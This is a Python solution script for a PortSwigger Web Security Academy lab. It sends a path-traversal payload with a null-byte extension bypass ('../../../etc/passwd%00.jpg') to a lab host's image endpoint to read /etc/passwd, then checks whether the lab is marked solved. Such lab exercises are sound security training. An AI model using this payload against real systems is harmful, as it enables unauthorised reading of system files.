#!/usr/bin/env python

'''This lab contains a file path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file.

Lab link: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
'''
import requests


lab_id = '0ad900d204ca393685cbcab200480021' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/"  


payload = 'image?filename=../../../etc/passwd%00.jpg' # directory traversal payload, exploit the image endpoint by using the 'filename' parameter

r1 = requests.get(uri + payload)
print(r1.text)

# reload page to trigger success flag
r2 = requests.get(uri)
if 'Solved' in r2.text:
    print('solved')
else:
    print('nope')